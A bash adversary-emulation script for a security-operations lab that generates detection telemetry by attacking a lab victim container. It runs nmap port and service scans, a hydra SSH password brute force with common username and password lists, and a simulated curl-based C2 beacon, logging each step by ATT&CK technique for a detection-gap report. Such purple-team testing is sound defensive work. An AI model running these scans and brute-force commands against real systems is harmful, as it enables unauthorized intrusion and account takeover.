#!/usr/bin/env bash
# Network recon + brute force from the attacker container against linux-victim.
# Lab targets only (docs/scope.md). Complements linux-intrusion.sh (which is
# host-side / docker exec); this one produces network_traffic + auth telemetry
# from a distinct source IP.
set -u

ATTACKER="${ATTACKER:-soc-in-a-box-attacker-1}"
TARGET="${TARGET:-linux-victim}"
DWELL="${DWELL:-30}"
RUNDIR="$(cd "$(dirname "$0")" && pwd)/runs"
mkdir -p "$RUNDIR"
RUNLOG="$RUNDIR/$(date -u +%Y%m%dT%H%M%SZ)-netrecon.jsonl"

aexec() { docker exec "$ATTACKER" sh -lc "$*" 2>&1 | sed 's/^/    /'; }
mark()  { printf '{"ts":"%s","technique":"%s","name":"%s"}\n' "$(date -u +%FT%TZ)" "$1" "$2" >> "$RUNLOG"; echo; echo "== $1  $2"; }

mark T1046 "Network Service Discovery - nmap"
aexec "nmap -Pn -sS -T4 --top-ports 100 $TARGET"
sleep "$DWELL"

mark T1046 "Service/version + default scripts"
aexec "nmap -Pn -sV -sC -p 22 $TARGET"
sleep "$DWELL"

mark T1110.001 "Brute Force - hydra SSH"
aexec "printf 'admin\nroot\nanalyst\nsvc-backup\noracle\n' > /tmp/u.txt; printf 'password\n123456\nadmin\nBackup2024\nletmein\nPassword1\n' > /tmp/p.txt; hydra -L /tmp/u.txt -P /tmp/p.txt -t 4 -f ssh://$TARGET 2>&1 | tail -n 15"
sleep "$DWELL"

mark T1071.001 "C2 check-in over HTTP (simulated beacon)"
aexec "for i in \$(seq 1 10); do curl -s -m 3 -A 'Mozilla/5.0' \"http://$TARGET:22/\" >/dev/null 2>&1; sleep 2; done; echo beaconed"
sleep "$DWELL"

echo
echo "[*] network recon complete  ->  $RUNLOG"
echo "[*] gap report:  pwsh scripts/detection-gap-report.ps1 -RunLog $RUNLOG"
